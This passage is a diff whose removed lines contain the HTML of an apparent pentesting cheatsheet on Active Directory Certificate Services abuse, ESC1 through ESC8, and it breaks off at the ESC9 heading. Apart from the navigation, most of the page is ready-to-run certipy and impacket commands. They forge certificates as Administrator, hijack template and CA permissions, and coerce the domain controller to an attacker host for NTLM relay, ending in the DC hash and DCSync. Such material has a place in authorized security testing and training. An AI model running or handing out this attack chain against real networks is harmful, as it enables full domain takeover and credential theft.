@@ -1,705 +1,186 @@
-<!DOCTYPE html>
-<html lang="en-US" dir="ltr" class="">
-<head>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>ADCS ESC1-16 | JinPwn</title><meta name="description" content="Active Directory Certificate Services misconfigurations, ESC1 through ESC16. Certipy v5 covers detection and exploitation for almost all of them.">
-<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-
-<link rel="canonical" href="https://jinpwn.dev/cheatsheets/active-directory/ad09-adcs-esc1-16/">
-<meta property="og:title" content="ADCS ESC1-16 | JinPwn">
-<meta property="og:description" content="Active Directory Certificate Services misconfigurations, ESC1 through ESC16. Certipy v5 covers detection and exploitation for almost all of them.">
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://jinpwn.dev/cheatsheets/active-directory/ad09-adcs-esc1-16/">
-<meta property="og:site_name" content="JinPwn">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="ADCS ESC1-16 | JinPwn">
-<meta name="twitter:description" content="Active Directory Certificate Services misconfigurations, ESC1 through ESC16. Certipy v5 covers detection and exploitation for almost all of them.">
-<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:site" content="@jinpwn">
-<meta name="twitter:creator" content="@jinpwn">
-
-
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"Active Directory Certificate Services misconfigurations, ESC1 through ESC16. Certipy v5 covers detection and exploitation for almost all of them.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"ADCS ESC1-16 | JinPwn","url":"https://jinpwn.dev/cheatsheets/active-directory/ad09-adcs-esc1-16/"}</script>
-
-<meta name="theme-color" content="#111111">
-<link rel="icon" type="image/png" href="/favicon.png">
-
-      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
-
-
-        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
-        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
-
-
-</head>
-<body class="">
-  
-
-
-
-
-
-  
-  
-  
-
-
-
-  
-
-<header class="site-header">
-  <nav class="top-nav">
-    <div class="container nav-inner">
-      <div class="nav-left">
-        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
-        <div class="nav-links desktop-only">
-          
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-        </div>
-      </div>
-      <div class="nav-actions">
-        <div class="search-anchor" id="search-root" data-search-root>
-          <label class="search-trigger" for="search-input">
-            <span class="search-glyph" aria-hidden="true">
-              <svg viewBox="0 0 24 24">
-                <circle cx="11" cy="11" r="7"></circle>
-                <path d="M20 20L16.65 16.65"></path>
-              </svg>
-            </span>
-            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
-            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
-              <svg viewBox="0 0 24 24" aria-hidden="true">
-                <path d="M18 6L6 18"></path>
-                <path d="M6 6l12 12"></path>
-              </svg>
-            </button>
-            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
-          </label>
-          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
-  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
-  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
-    <p class="search-empty">Type to search posts and cheatsheets.</p>
-  </div>
-</div>
-
-        </div>
-        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
-          <svg viewBox="0 0 24 24" aria-hidden="true">
-            <circle cx="11" cy="11" r="7"></circle>
-            <path d="M20 20L16.65 16.65"></path>
-          </svg>
-        </button>
-        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
-            <path d="M3 6h18"></path>
-            <path d="M3 12h18"></path>
-            <path d="M3 18h18"></path>
-          </svg>
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
-            <path d="M18 6L6 18"></path>
-            <path d="M6 6l12 12"></path>
-          </svg>
-        </button>
-      </div>
-    </div>
-    <div id="mobile-nav" class="mobile-nav">
-      
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-    </div>
-  </nav>
-</header>
-
-  
-  <main class="site-main">
-    
-  
-  
-  
-  <article class="container cheatsheet-docs-shell">
-    <div class="cheatsheet-docs-layout">
-      
-        <aside class="cheatsheet-sidebar" aria-label="Active Directory Pentesting navigation">
-    <div class="cheatsheet-sidebar-inner">
-      
-        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
-      
-      <a href="/cheatsheets/active-directory/" class="cheatsheet-sidebar-section">Active Directory Pentesting</a>
-      
-        <nav class="cheatsheet-sidebar-nav">
-          <ul class="cheatsheet-sidebar-list">
-            
-              <li>
-                <a href="/cheatsheets/active-directory/00-ad-moc/" class="cheatsheet-sidebar-link">AD MOC</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad01-enumeration/" class="cheatsheet-sidebar-link">Enumeration</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad02-bloodhound/" class="cheatsheet-sidebar-link">BloodHound</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad03-kerberoasting/" class="cheatsheet-sidebar-link">Kerberoasting</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad04-as-rep-roasting/" class="cheatsheet-sidebar-link">AS-REP Roasting</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad05-password-spraying/" class="cheatsheet-sidebar-link">Password Spraying</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/" class="cheatsheet-sidebar-link">LLMNR &amp; NTLM Relay</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad07-acl-abuse/" class="cheatsheet-sidebar-link">ACL Abuse</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad08-delegation/" class="cheatsheet-sidebar-link">Delegation</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad09-adcs-esc1-16/" class="cheatsheet-sidebar-link is-current">ADCS ESC1-16</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad10-lateral-movement/" class="cheatsheet-sidebar-link">Lateral Movement</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad11-credential-dumping/" class="cheatsheet-sidebar-link">Credential Dumping</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad12-dcsync/" class="cheatsheet-sidebar-link">DCSync</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad13-trust-attacks/" class="cheatsheet-sidebar-link">Trust Attacks</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/active-directory/ad14-persistence/" class="cheatsheet-sidebar-link">Persistence</a>
-              </li>
-            
-          </ul>
-        </nav>
-      
-    </div>
-  </aside>
-      
-      <div class="cheatsheet-docs-main cheatsheet-page-main">
-        <header class="cheatsheet-page-header">
-          <h1>ADCS ESC1-16</h1>
-          
-        </header>
-
-        
-          <details class="cheatsheet-mobile-sections">
-    <summary class="cheatsheet-mobile-sections-summary">
-      <span class="cheatsheet-mobile-sections-label">Sections</span>
-      <span class="cheatsheet-mobile-sections-current">ADCS ESC1-16</span>
-      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
-    </summary>
-    <div class="cheatsheet-mobile-sections-panel">
-      <nav aria-label="Active Directory Pentesting sections">
-        <ul class="cheatsheet-mobile-sections-list">
-          
-            <li>
-              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
-            </li>
-          
-          <li>
-            <a href="/cheatsheets/active-directory/" class="cheatsheet-mobile-sections-link">Overview</a>
-          </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/00-ad-moc/" class="cheatsheet-mobile-sections-link">AD MOC</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad01-enumeration/" class="cheatsheet-mobile-sections-link">Enumeration</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad02-bloodhound/" class="cheatsheet-mobile-sections-link">BloodHound</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad03-kerberoasting/" class="cheatsheet-mobile-sections-link">Kerberoasting</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad04-as-rep-roasting/" class="cheatsheet-mobile-sections-link">AS-REP Roasting</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad05-password-spraying/" class="cheatsheet-mobile-sections-link">Password Spraying</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/" class="cheatsheet-mobile-sections-link">LLMNR &amp; NTLM Relay</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad07-acl-abuse/" class="cheatsheet-mobile-sections-link">ACL Abuse</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad08-delegation/" class="cheatsheet-mobile-sections-link">Delegation</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad09-adcs-esc1-16/" class="cheatsheet-mobile-sections-link is-current">ADCS ESC1-16</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad10-lateral-movement/" class="cheatsheet-mobile-sections-link">Lateral Movement</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad11-credential-dumping/" class="cheatsheet-mobile-sections-link">Credential Dumping</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad12-dcsync/" class="cheatsheet-mobile-sections-link">DCSync</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad13-trust-attacks/" class="cheatsheet-mobile-sections-link">Trust Attacks</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/active-directory/ad14-persistence/" class="cheatsheet-mobile-sections-link">Persistence</a>
-            </li>
-          
-        </ul>
-      </nav>
-    </div>
-  </details>
-        
-
-        <div class="markdown-content cheatsheet-page-body">
-          <p>Active Directory Certificate Services misconfigurations, ESC1 through ESC16. Certipy v5 covers detection and exploitation for almost all of them.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">DC</span><span class="o">=</span>10.10.11.50
-</span></span><span class="line"><span class="cl"><span class="nv">DOMAIN</span><span class="o">=</span>corp.local
-</span></span><span class="line"><span class="cl"><span class="nv">USER</span><span class="o">=</span><span class="s1">&#39;svc_user&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">PASS</span><span class="o">=</span><span class="s1">&#39;Password1&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">CA</span><span class="o">=</span><span class="s1">&#39;CORP-CA&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">CA_HOST</span><span class="o">=</span><span class="s1">&#39;ca.corp.local&#39;</span>
-</span></span></code></pre></div><h2 id="i-enumerate" data-heading-permalink="true"><span class="heading-content">i. Enumerate</span>
-    <a class="heading-permalink" href="#i-enumerate" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Certipy find shows everything: templates, CA config, vulnerabilities flagged per template:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy find -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> -stdout
-</span></span><span class="line"><span class="cl"><span class="c1">## Just vulnerable ones, less noise:</span>
-</span></span><span class="line"><span class="cl">certipy find -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> -stdout -vulnerable
-</span></span><span class="line"><span class="cl"><span class="c1">## Hide admin permissions to reduce output:</span>
-</span></span><span class="line"><span class="cl">certipy find -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> -stdout -hide-admins -vulnerable
-</span></span><span class="line"><span class="cl"><span class="c1">## Save full output to JSON + TXT for reference:</span>
-</span></span><span class="line"><span class="cl">certipy find -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Output: YYYYMMDDHHMMSS_Certipy.json + _Certipy.txt + _Certipy.zip (BloodHound import)</span>
-</span></span></code></pre></div><p>Drop the zip into BloodHound, certipy adds <code>ADCSESC1</code> through <code>ADCSESC16</code> edges automatically.</p>
-<h2 id="ii-esc1---enrollee-supplies-subject--client-auth-eku" data-heading-permalink="true"><span class="heading-content">ii. ESC1 - Enrollee supplies subject + Client Auth EKU</span>
-    <a class="heading-permalink" href="#ii-esc1---enrollee-supplies-subject--client-auth-eku" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Template lets you specify the SAN, and the cert can be used to authenticate. Request a cert AS Administrator:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy req -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -target <span class="nv">$CA_HOST</span> -ca <span class="nv">$CA</span> -template VulnTemplate <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -upn Administrator@<span class="nv">$DOMAIN</span> -sid <span class="s1">&#39;S-1-5-21-...-500&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Output: administrator.pfx</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Use the cert to get Administrator&#39;s NT hash:</span>
-</span></span><span class="line"><span class="cl">certipy auth -pfx administrator.pfx -dc-ip <span class="nv">$DC</span>
-</span></span></code></pre></div><div class="obsidian-callout callout-warning">
-  <div class="obsidian-callout-header">
-    <div class="obsidian-callout-icon" aria-hidden="true">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
-          <path d="M12 9v4"></path>
-          <path d="M12 17h.01"></path></svg>
-    </div>
-    <span class="obsidian-callout-title">-sid is required post-CVE-2022-26923</span>
-  </div>
-  <div class="obsidian-callout-body">
-    <p>The <code>-sid</code> flag attaches the szOID_NTDS_CA_SECURITY_EXT extension. Without it, post-patch DCs reject the cert. Get the target&rsquo;s SID from <code>nxc ldap $DC --get-sid</code> or <code>impacket-lookupsid</code>.</p>
-  </div>
-</div>
-<h2 id="iii-esc2---any-purpose--subca-template" data-heading-permalink="true"><span class="heading-content">iii. ESC2 - Any Purpose / SubCA template</span>
-    <a class="heading-permalink" href="#iii-esc2---any-purpose--subca-template" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>The template has Any Purpose EKU (or no EKU = same effect). Same exploit as ESC1, just specify the target&rsquo;s UPN:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy req -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -target <span class="nv">$CA_HOST</span> -ca <span class="nv">$CA</span> -template AnyPurposeTemplate <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -upn Administrator@<span class="nv">$DOMAIN</span> -sid <span class="s1">&#39;S-1-5-21-...-500&#39;</span>
-</span></span><span class="line"><span class="cl">certipy auth -pfx administrator.pfx -dc-ip <span class="nv">$DC</span>
-</span></span></code></pre></div><h2 id="iv-esc3---enrollment-agent-template" data-heading-permalink="true"><span class="heading-content">iv. ESC3 - Enrollment Agent template</span>
-    <a class="heading-permalink" href="#iv-esc3---enrollment-agent-template" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>You can enroll for a cert that has Certificate Request Agent EKU. Then use that cert to enroll on behalf of another user.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Step 1: Enroll as yourself for the EA cert</span>
-</span></span><span class="line"><span class="cl">certipy req -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -target <span class="nv">$CA_HOST</span> -ca <span class="nv">$CA</span> -template EnrollmentAgentTemplate
-</span></span><span class="line"><span class="cl"><span class="c1">## Output: svc_user.pfx (EA cert)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">## Step 2: Use the EA cert to request a cert AS Administrator</span>
-</span></span><span class="line"><span class="cl">certipy req -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -target <span class="nv">$CA_HOST</span> -ca <span class="nv">$CA</span> -template User <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -pfx svc_user.pfx -on-behalf-of <span class="s2">&#34;</span><span class="nv">$DOMAIN</span><span class="s2">\\Administrator&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Output: administrator.pfx</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">## Step 3: Authenticate</span>
-</span></span><span class="line"><span class="cl">certipy auth -pfx administrator.pfx -dc-ip <span class="nv">$DC</span>
-</span></span></code></pre></div><h2 id="v-esc4---template-writedacl-template-acl-hijack" data-heading-permalink="true"><span class="heading-content">v. ESC4 - Template WriteDacl (template ACL hijack)</span>
-    <a class="heading-permalink" href="#v-esc4---template-writedacl-template-acl-hijack" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>You have write rights to the template object. Make it ESC1-vulnerable, then exploit as ESC1.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Save current template config:</span>
-</span></span><span class="line"><span class="cl">certipy template -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> -template VulnTemplate -save-old
-</span></span><span class="line"><span class="cl"><span class="c1">## Overwrite to ESC1-vulnerable defaults:</span>
-</span></span><span class="line"><span class="cl">certipy template -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> -template VulnTemplate -write-default-configuration
-</span></span><span class="line"><span class="cl"><span class="c1">## Now exploit as ESC1:</span>
-</span></span><span class="line"><span class="cl">certipy req -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -target <span class="nv">$CA_HOST</span> -ca <span class="nv">$CA</span> -template VulnTemplate <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -upn Administrator@<span class="nv">$DOMAIN</span> -sid <span class="s1">&#39;S-1-5-21-...-500&#39;</span>
-</span></span><span class="line"><span class="cl">certipy auth -pfx administrator.pfx -dc-ip <span class="nv">$DC</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Restore template:</span>
-</span></span><span class="line"><span class="cl">certipy template -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> -template VulnTemplate -configuration template.json
-</span></span></code></pre></div><h2 id="vi-esc5---object-owner--dacl-on-ad-objects" data-heading-permalink="true"><span class="heading-content">vi. ESC5 - Object owner / DACL on AD objects</span>
-    <a class="heading-permalink" href="#vi-esc5---object-owner--dacl-on-ad-objects" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>A range of AD objects related to PKI (CA, NTAuthCertificates container, etc) have weak ACLs. Specific to the misconfig - sometimes leads to ESC4, sometimes lets you publish a malicious root CA.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Identify which object via certipy find output</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Then chain via the appropriate primitive (template write -&gt; ESC4, etc)</span>
-</span></span></code></pre></div><h2 id="vii-esc6---editf_attributesubjectaltname2-enabled-on-ca" data-heading-permalink="true"><span class="heading-content">vii. ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 enabled on CA</span>
-    <a class="heading-permalink" href="#vii-esc6---editf_attributesubjectaltname2-enabled-on-ca" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Any cert template that allows authentication becomes vulnerable to SAN injection because the CA honors user-supplied SANs regardless of template setting.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Any template with Client Auth + your enroll right is now ESC1-like</span>
-</span></span><span class="line"><span class="cl">certipy req -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -target <span class="nv">$CA_HOST</span> -ca <span class="nv">$CA</span> -template User <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -upn Administrator@<span class="nv">$DOMAIN</span> -sid <span class="s1">&#39;S-1-5-21-...-500&#39;</span>
-</span></span><span class="line"><span class="cl">certipy auth -pfx administrator.pfx -dc-ip <span class="nv">$DC</span>
-</span></span></code></pre></div><h2 id="viii-esc7---vulnerable-ca-permissions-manageca--managecertificates" data-heading-permalink="true"><span class="heading-content">viii. ESC7 - Vulnerable CA permissions (ManageCA / ManageCertificates)</span>
-    <a class="heading-permalink" href="#viii-esc7---vulnerable-ca-permissions-manageca--managecertificates" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>You have ManageCA or ManageCertificates rights on the CA itself. Two paths:</p>
-<h3 id="manageca-enable-esc6-then-esc1" data-heading-permalink="true"><span class="heading-content">ManageCA: enable ESC6, then ESC1</span>
-    <a class="heading-permalink" href="#manageca-enable-esc6-then-esc1" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy ca -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> -ca <span class="nv">$CA</span> -enable-edit-flag EDITF_ATTRIBUTESUBJECTALTNAME2
-</span></span><span class="line"><span class="cl"><span class="c1">## Now ESC6 applies, exploit as ESC1</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Restore when done:</span>
-</span></span><span class="line"><span class="cl">certipy ca -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> -ca <span class="nv">$CA</span> -disable-edit-flag EDITF_ATTRIBUTESUBJECTALTNAME2
-</span></span></code></pre></div><h3 id="manageca--add-yourself-as-officer-approve-a-pending-request" data-heading-permalink="true"><span class="heading-content">ManageCA + add yourself as Officer, approve a pending request</span>
-    <a class="heading-permalink" href="#manageca--add-yourself-as-officer-approve-a-pending-request" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy ca -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> -ca <span class="nv">$CA</span> -add-officer <span class="nv">$USER</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Submit a request without enrollment right (it goes pending):</span>
-</span></span><span class="line"><span class="cl">certipy req -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -target <span class="nv">$CA_HOST</span> -ca <span class="nv">$CA</span> -template SubCA <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -upn Administrator@<span class="nv">$DOMAIN</span> -sid <span class="s1">&#39;S-1-5-21-...-500&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Note the request ID, then issue it:</span>
-</span></span><span class="line"><span class="cl">certipy ca -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> -ca <span class="nv">$CA</span> -issue-request <span class="nv">$REQ_ID</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Retrieve the issued cert:</span>
-</span></span><span class="line"><span class="cl">certipy req -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> -target <span class="nv">$CA_HOST</span> -ca <span class="nv">$CA</span> -retrieve <span class="nv">$REQ_ID</span>
-</span></span><span class="line"><span class="cl">certipy auth -pfx administrator.pfx -dc-ip <span class="nv">$DC</span>
-</span></span></code></pre></div><h2 id="ix-esc8---ntlm-relay-to-http-cert-enrollment" data-heading-permalink="true"><span class="heading-content">ix. ESC8 - NTLM relay to HTTP cert enrollment</span>
-    <a class="heading-permalink" href="#ix-esc8---ntlm-relay-to-http-cert-enrollment" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>CA has Web Enrollment enabled and accepts NTLM. Coerce DC$ to authenticate, relay to /certsrv/, get a DC cert.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Terminal 1: certipy in relay mode</span>
-</span></span><span class="line"><span class="cl">certipy relay -target <span class="s2">&#34;http://</span><span class="nv">$CA_HOST</span><span class="s2">&#34;</span> -template DomainController
-</span></span><span class="line"><span class="cl"><span class="c1">## or:</span>
-</span></span><span class="line"><span class="cl">sudo impacket-ntlmrelayx -t <span class="s2">&#34;http://</span><span class="nv">$CA_HOST</span><span class="s2">/certsrv/certfnsh.asp&#34;</span> --adcs --template DomainController -smb2support
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">## Terminal 2: coerce DC to authenticate to attacker</span>
-</span></span><span class="line"><span class="cl">impacket-petitpotam -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> <span class="nv">$ATTACKER</span> <span class="nv">$DC</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## or:</span>
-</span></span><span class="line"><span class="cl">coercer coerce -l <span class="nv">$ATTACKER</span> -t <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> -d <span class="nv">$DOMAIN</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">## After relay: certipy saves DC.pfx</span>
-</span></span><span class="line"><span class="cl">certipy auth -pfx dc.pfx -dc-ip <span class="nv">$DC</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Output: NT hash of DC$ -&gt; DCSync, see [DCSync](https://jinpwn.dev/cheatsheets/active-directory/ad12-dcsync/)</span>
-</span></span></code></pre></div><p>ESC8 against HTTPS endpoint requires Channel Binding to be disabled, which is rare in 2026. HTTP endpoint is more common to be available.</p>
-<h2 id="x-esc9---no-sid-security-extension-cve-2022-26923" data-heading-permalink="true"><span class="heading-content">x. ESC9 - No SID security extension (CVE-2022-26923)</span>
-    <a class="heading-permalink" href="#x-esc9---no-sid-security-extension-cve-2022-26923" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
